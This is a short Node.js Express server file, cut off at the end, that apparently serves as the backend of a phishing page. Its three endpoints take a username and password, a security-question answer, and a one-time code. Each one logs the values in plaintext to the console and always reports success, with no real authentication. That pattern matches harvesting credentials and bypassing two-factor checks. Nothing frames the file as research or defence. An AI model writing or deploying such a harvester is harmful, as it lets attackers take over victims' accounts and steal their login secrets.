const express = require('express');
const path = require('path');
const app = express();

// تم زيادة الحد الأقصى لحجم البيانات إلى 50 ميجابايت
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true, limit: '50mb' }));

app.use(express.static(__dirname));

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'pages', 'index.html'));
});

app.post("/api/login", (req, res) => {
    const { username, password } = req.body;

    console.log("\n========== LOGIN ==========");
    console.log("Username:", username);
    console.log("Password:", password);
    console.log("حجم البيانات المستلمة:", JSON.stringify(req.body).length, "حرف");
    console.log("===========================\n");

    res.json({ success: true });
});

app.post("/api/security", (req, res) => {
    const { username, question, answer } = req.body;

    console.log("\n========= SECURITY =========");
    console.log("Username:", username);
    console.log("Question:", question);
    console.log("Answer:", answer);
    console.log("حجم البيانات المستلمة:", JSON.stringify(req.body).length, "حرف");
    console.log("============================\n");

    res.json({ success: true });
});

app.post("/api/demo", (req, res) => {
    const { username, demoCode } = req.body;

    console.log("\n=========== OTP ===========");
    console.log("Username:", username);
    console.log("Code:", demoCode);
    console.log("حجم البيانات المستلمة:", JSON.stringify(req.body).length, "حرف");
    console.log("===========================\n");

    res.json({ success: true });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Server is running successfully on port ${PORT}`);
